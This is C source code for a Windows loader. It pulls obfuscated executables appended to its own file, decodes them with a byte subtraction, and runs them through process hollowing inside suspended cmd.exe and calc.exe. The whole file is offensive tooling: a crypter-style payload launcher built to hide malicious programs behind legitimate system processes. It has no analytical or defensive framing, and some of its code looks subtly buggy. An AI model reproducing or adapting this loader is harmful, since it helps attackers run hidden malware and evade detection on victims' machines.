#include <stdio.h>
#include <string.h>
#include <winnt.h>
#include <Windows.h>
#include <TlHelp32.h>

#ifdef _WIN64
#define CONTEXTAX(pCTX) pCTX->Rax
#define CONTEXTBX(pCTX) pCTX->Rbx
#else
#define CONTEXTAX(pCTX) pCTX->Eax
#define CONTEXTBX(pCTX) pCTX->Ebx
#endif

typedef struct _FILE_DATA
{
  DWORD dwFileCounts;
  PDWORD pSizeData;
  PBYTE *pContentsData;
} FILEDATA, *PFILEDATA;

void DecryptFileData(PBYTE pData, DWORD pDataSize)
{
  for (int i = 0; i < pDataSize; ++i)
  {
    pData[i] -= 0xCC;
  }
}

PFILEDATA GetFileDivInfo(LPCTSTR szFileName)
{
  HANDLE hRead = INVALID_HANDLE_VALUE;
  PFILEDATA pFileData = {0};
  DWORD i, nRead = 0;

  // Read the file
  hRead = CreateFileA(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
  if (hRead == INVALID_HANDLE_VALUE)
  {
    printf("[!] It's not found the CreateFile hRead !!\n");
    return FALSE;
  }

  pFileData = malloc(sizeof(FILEDATA));
  memset(pFileData, 0, sizeof(FILEDATA));

  // Get the file counts
  SetFilePointer(hRead, -4, 0, FILE_END);
  ReadFile(hRead, &pFileData->dwFileCounts, 4, &nRead, NULL);

  // Malloc for the contents size
  pFileData->pSizeData = (PDWORD)malloc(sizeof(DWORD) * pFileData->dwFileCounts);
  memset(pFileData->pSizeData, 0, sizeof(DWORD) * pFileData->dwFileCounts);

  for (i = pFileData->dwFileCounts; i > 0; --i)
  {
    // Get the file size
    SetFilePointer(hRead, -8, 0, FILE_CURRENT);
    ReadFile(hRead, &pFileData->pSizeData[i - 1], 4, &nRead, NULL);
  }

  SetFilePointer(hRead, 0, 0, FILE_BEGIN);

  // Malloc for the file counts
  pFileData->pContentsData = (PBYTE *)malloc(sizeof(PBYTE) * pFileData->dwFileCounts);
  memset(pFileData->pContentsData, 0, sizeof(PBYTE) * pFileData->dwFileCounts);

  for (i = 0; i < pFileData->dwFileCounts; ++i)
  {
    // Allocate for the contents Data
    pFileData->pContentsData[i] = (PBYTE)VirtualAlloc(NULL, pFileData->pSizeData[i], MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (pFileData->pContentsData[i] == NULL)
    {
      printf("[!] It's not found the VirtualAlloc pFileData->pContentsData[i] !!\n");
      return FALSE;
    }
    memset(pFileData->pContentsData[i], 0, pFileData->pSizeData[i]);

    // Get the file data
    ReadFile(hRead, pFileData->pContentsData[i], pFileData->pSizeData[i], &nRead, NULL);

    if (i > 0)
    {
      // Decrypt the file data
      DecryptFileData(pFileData->pContentsData[i], pFileData->pSizeData[i]);
    }
  }
  CloseHandle(hRead);
  return pFileData;
}

int RunProcessHollowing(const unsigned char *pImage, LPCTSTR szFilePath)
{
  PIMAGE_DOS_HEADER pIDH;
  PIMAGE_NT_HEADERS pINH;
  PIMAGE_SECTION_HEADER pISH;

  PROCESS_INFORMATION pi;
  STARTUPINFOA si;

  CONTEXT *pCTX;

  LPVOID lpImageBase, lpTargetBase;

  pIDH = (PIMAGE_DOS_HEADER)pImage;
  pINH = (PIMAGE_NT_HEADERS)((DWORD)pImage + pIDH->e_lfanew);

  // Check if image is a PE File.
  if (pINH->Signature == IMAGE_NT_SIGNATURE)
  {
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));

    // CreateProcess in suspended state, for the new image.
    if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
      // Allocate memory for the context.
      pCTX = (LPCONTEXT)(VirtualAlloc(NULL, sizeof(pCTX), MEM_COMMIT, PAGE_READWRITE));
      pCTX->ContextFlags = CONTEXT_FULL; // Context is allocated

      //If context is in thread
      if (GetThreadContext(pi.hThread, (LPCONTEXT)pCTX))
      {
        // Read PEB ImageBase
        ReadProcessMemory(pi.hProcess, (LPVOID)(CONTEXTBX(pCTX) + 8), &lpImageBase, 4, 0);

        // ZwUnmapViewOfSection or NtUnmapViewOfSection WIN32 API
        typedef LONG(WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
        NtUnmapViewOfSection NewNtUnmapViewOfSection;

        // If lpImageBase equal OptionalHeader.ImageBase, unmap lpImageBase
        if ((DWORD)lpImageBase == pINH->OptionalHeader.ImageBase)
        {
          NewNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
          NewNtUnmapViewOfSection(pi.hProcess, lpImageBase);
        }

        // Allocate lpTargetBase for the dummy process
        lpTargetBase = VirtualAllocEx(pi.hProcess, (LPVOID)pINH->OptionalHeader.ImageBase, pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        // Write the PE Header / Write the image to the process
        WriteProcessMemory(pi.hProcess, lpTargetBase, pImage, pINH->OptionalHeader.SizeOfHeaders, NULL);

        // Write the section data
        for (int i = 0; i < pINH->FileHeader.NumberOfSections; i++)
        {
          pISH = (PIMAGE_SECTION_HEADER)((DWORD)pImage + pIDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

          WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)lpTargetBase + pISH->VirtualAddress), (LPVOID)((DWORD)pImage + pISH->PointerToRawData), pISH->SizeOfRawData, NULL);
        }

        // Set EntryPoint // Move address of entry point to the eax register
        CONTEXTAX(pCTX) = (DWORD)lpTargetBase + pINH->OptionalHeader.AddressOfEntryPoint;

        // Set the PEB ImageBase
        WriteProcessMemory(pi.hProcess, (PVOID)(CONTEXTBX(pCTX) + 8), &pINH->OptionalHeader.ImageBase, 4, 0);

        ReadProcessMemory(pi.hProcess, (LPVOID)(CONTEXTBX(pCTX) + 8), &lpImageBase, 4, 0);

        // Set the context
        SetThreadContext(pi.hThread, (LPCONTEXT)pCTX);
        // Start the process / call main()
        ResumeThread(pi.hThread);

        // Clear memory
        VirtualFree(pCTX, 0, MEM_RELEASE);
        VirtualFreeEx(pi.hProcess, lpTargetBase, pINH->OptionalHeader.SizeOfImage, MEM_RESERVE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);

        return TRUE;
      }
    }
  }
  return FALSE;
}

void ClearHandle(PFILEDATA pFileData)
{
  // Clear memory
  for (int i = 0; i < pFileData->dwFileCounts; ++i)
  {
    VirtualFree(pFileData->pContentsData[i], 0, MEM_RELEASE);
  }
  free(pFileData->pSizeData);
  free(pFileData->pContentsData);
  free(pFileData);
}

int main()
{
  PFILEDATA pFileData;

  CHAR szDivInputFileName[256], dummyName[2][256], systemPath[256];

  GetSystemDirectory(systemPath, 256);
  GetModuleFileNameA(0, szDivInputFileName, 1024);

  sprintf(dummyName[0], "%s\\cmd.exe", systemPath);
  sprintf(dummyName[1], "%s\\calc.exe", systemPath);

  // Get the file div info
  if (!(pFileData = GetFileDivInfo(szDivInputFileName)))
  {
    printf("[!] It's not found the GetFileDivInfo !!\n");
    return FALSE;
  }

  // Run process hollowing
  if (!RunProcessHollowing(pFileData->pContentsData[1], dummyName[0]))
  {
    printf("[!] It's not found the RunProcessHollowing[1] !!\n");
    return FALSE;
  }

  if (!RunProcessHollowing(pFileData->pContentsData[2], dummyName[1]))
  {
    printf("[!] It's not found the RunProcessHollowing[2] !!\n");
    return FALSE;
  }

  ClearHandle(pFileData);

  return 0;
}